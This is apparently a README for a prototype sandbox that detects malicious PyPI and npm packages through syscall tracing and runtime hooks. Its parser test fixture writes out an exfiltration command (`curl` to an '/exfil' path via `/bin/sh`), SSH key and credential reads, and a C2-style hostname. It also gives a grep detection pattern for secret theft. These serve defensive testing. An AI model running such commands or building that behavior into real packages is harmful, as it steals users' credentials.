# Package Behavioral Sandbox

An Ubuntu/Docker-based behavioral analysis prototype for PyPI and npm packages.
It separates package behavior into:

- **Install time**: `pip install` or `npm install`
- **Import time**: Python `import` or Node.js `require`

The scanner combines Linux syscall tracing with Python and Node.js runtime hooks
and emits a machine-readable behavioral fingerprint.

## Project files

| File | Purpose |
|---|---|
| `Dockerfile` | Ubuntu 24.04 honeypot image with canary files and fake secrets |
| `trace_runner.sh` | Runs install/import phases inside the container |
| `sitecustomize.py` | Python environment, audit, DNS, socket, and subprocess telemetry |
| `node_preload.js` | Node.js environment, DNS, HTTP, and HTTPS telemetry |
| `parse_trace.py` | Converts trace logs into the JSON contract |
| `sandbox_service.py` | Host-side download, hashing, Docker orchestration, and API function |
| `run_sandbox.py` | Command-line wrapper around `run_behavioral_scan` |
| `create_test_packages.py` | Generates local benign and simulated malicious PyPI archives |

## Requirements

- Ubuntu Linux
- Docker Engine
- Python 3.10 or newer
- `jq` for convenient JSON inspection

The current user must be allowed to access Docker:

```bash
sudo usermod -aG docker "$USER"
```

Log out and back in, or activate the group in a new shell:

```bash
newgrp docker
```

Verify access:

```bash
docker ps
```

Do not create `/logs` or `/app/site-packages` directly on the host. Those are
container paths created and mounted by the scanner.

## Build the sandbox image

From this directory:

```bash
docker build --no-cache -t behavioral-sandbox:latest .
```

The image contains:

- Ubuntu 24.04
- Python 3 and pip
- Node.js and npm
- `strace`
- Canary files:
  - `/root/.ssh/id_rsa`
  - `/root/.aws/credentials`
  - `/app/.env`
- Fake environment variables:
  - `AWS_SECRET_ACCESS_KEY`
  - `GITHUB_TOKEN`
  - `OPENAI_API_KEY`
  - `STRIPE_SECRET_KEY`

## Generate offline test packages

```bash
/usr/bin/python3 create_test_packages.py
```

This creates:

```text
test-packages/benign_str_utils-0.1.0.tar.gz
test-packages/evil_str_utils-0.1.0.tar.gz
```

The malicious archive is a controlled test fixture. It attempts to read a
canary file and environment variable, spawn `/bin/sh`, and connect to the
documentation-only address `198.51.100.99`. It is not a real malicious package.

## Run a local PyPI scan

Benign package:

```bash
rm -f benign-result.json

/usr/bin/python3 run_sandbox.py \
  pypi \
  benign-str-utils \
  --local-archive test-packages/benign_str_utils-0.1.0.tar.gz \
  > benign-result.json
```

Simulated malicious package:

```bash
rm -f evil-result.json

/usr/bin/python3 run_sandbox.py \
  pypi \
  evil-str-utils \
  --local-archive test-packages/evil_str_utils-0.1.0.tar.gz \
  > evil-result.json
```

Inspect the results:

```bash
jq . benign-result.json
jq . evil-result.json
```

Check metadata:

```bash
jq '.sandbox_metadata' benign-result.json
jq '.sandbox_metadata' evil-result.json
```

Search the malicious result for expected indicators:

```bash
grep -E 'id_rsa|AWS_SECRET_ACCESS_KEY|198\.51\.100\.99|curl|/bin/sh' evil-result.json
```

## Scan a real local archive

PyPI source archive or wheel:

```bash
/usr/bin/python3 run_sandbox.py \
  pypi \
  package-name \
  --local-archive /absolute/path/to/package.whl
```

For registry scans, omit `--local-archive`:

```bash
/usr/bin/python3 run_sandbox.py pypi package-name
/usr/bin/python3 run_sandbox.py npm package-name
```

Registry downloads happen on the host before the package is copied into the
network-isolated container. Package execution uses `--network=none`.

## Python API

Member 3 can call the host orchestrator directly:

```python
from sandbox_service import run_behavioral_scan

result = run_behavioral_scan(
    ecosystem="pypi",
    package_name="evil-str-utils",
    local_archive_path="test-packages/evil_str_utils-0.1.0.tar.gz",
)
```

The function returns a dictionary with this structure:

```json
{
  "package": {
    "ecosystem": "pypi",
    "name": "evil-str-utils",
    "version": "0.1.0",
    "sha256": "..."
  },
  "behavioral_fingerprint": {
    "install_time": {
      "network_calls": [],
      "files_touched": [],
      "env_vars_read": [],
      "subprocesses_spawned": []
    },
    "import_time": {
      "network_calls": [],
      "files_touched": [],
      "env_vars_read": [],
      "subprocesses_spawned": []
    }
  },
  "sandbox_metadata": {
    "duration_ms": 0,
    "timed_out": false,
    "exit_code": 0
  }
}
```

## Direct parser test

The parser can be tested without Docker:

```bash
tmpdir=$(mktemp -d)

cat > "$tmpdir/strace.log" <<'EOF'
123 openat(AT_FDCWD, "/root/.ssh/id_rsa", O_RDONLY) = 3
123 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("198.51.100.99")}, 16) = -1
123 execve("/bin/sh", ["/bin/sh", "-c", "curl http://198.51.100.99/exfil"], 0x0) = 0
EOF

cat > "$tmpdir/runtime.jsonl" <<'EOF'
{"event":"env_read","key":"AWS_SECRET_ACCESS_KEY"}
{"event":"dns_lookup","host":"evil-c2.example.com"}
EOF

/usr/bin/python3 parse_trace.py \
  --phase install \
  --strace "$tmpdir/strace.log" \
  --runtime "$tmpdir/runtime.jsonl" \
  --ecosystem pypi \
  --name evil-str-utils \
  --version 0.1.0 \
  --sha256 test-hash \
  --duration-ms 100 \
  --exit-code 0 | jq .

rm -rf "$tmpdir"
```

## Validation commands

```bash
bash -n trace_runner.sh
node --check node_preload.js
/usr/bin/python3 -m py_compile \
  run_sandbox.py \
  sandbox_service.py \
  parse_trace.py \
  sitecustomize.py \
  create_test_packages.py
```

## Security and production notes

This is a functional behavioral-analysis prototype. Before production use,
review and harden the following:

- Replace `seccomp=unconfined` with a restrictive seccomp profile.
- Add AppArmor or SELinux policy enforcement.
- Drop unnecessary container capabilities.
- Evaluate running package code as a non-root user.
- Keep package archives and mounted trace directories isolated.
- Add retention and access controls for trace output.
- Add automated parser, timeout, malformed-archive, and npm integration tests.
- Improve distribution-name to import-name resolution for PyPI packages.
- Preserve and monitor failed phase stdout/stderr.

The JSON fingerprint is intended for downstream comparison by the AI/LLM
component and storage by the backend service.
